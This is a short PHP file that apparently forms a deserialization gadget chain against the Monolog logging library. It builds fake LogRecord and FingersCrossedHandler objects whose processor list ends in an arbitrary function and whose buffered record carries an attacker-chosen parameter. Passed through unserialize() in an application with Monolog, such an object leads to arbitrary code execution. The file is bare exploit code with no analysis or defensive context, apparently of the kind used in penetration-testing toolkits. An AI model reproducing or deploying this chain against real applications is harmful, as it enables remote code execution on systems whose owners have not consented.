<?php

namespace Monolog {
    enum Level: int
    {
        case Debug = 100;
    }

    class LogRecord
    {
        public \DateTimeImmutable $datetime;
        public string $channel = '';
        public Level $level;
        public string $message = '';
        public array $context = [];
        public array $extra = [];
        public mixed $formatted = null;

        public function __construct(mixed $cmd)
        {
            $this->datetime = new \DateTimeImmutable();
            $this->level = \Monolog\Level::Debug;
            $this->formatted = $cmd;
        }
    }
}

namespace Monolog\Handler {
    class FingersCrossedHandler
    {
        protected \Monolog\Level $passthruLevel;
        protected $handler;
        protected bool $buffering = true;
        protected bool $stopBuffering = false;
        protected array $buffer;
        protected array $processors;
        protected bool $bubble = true;

        public function __construct(string $function, mixed $parameter)
        {
            $this->passthruLevel = \Monolog\Level::Debug;
            $this->handler = $this;
            $this->buffer = [new \Monolog\LogRecord($parameter)];
            $this->processors = ['get_object_vars', 'end', $function];
        }
    }
}
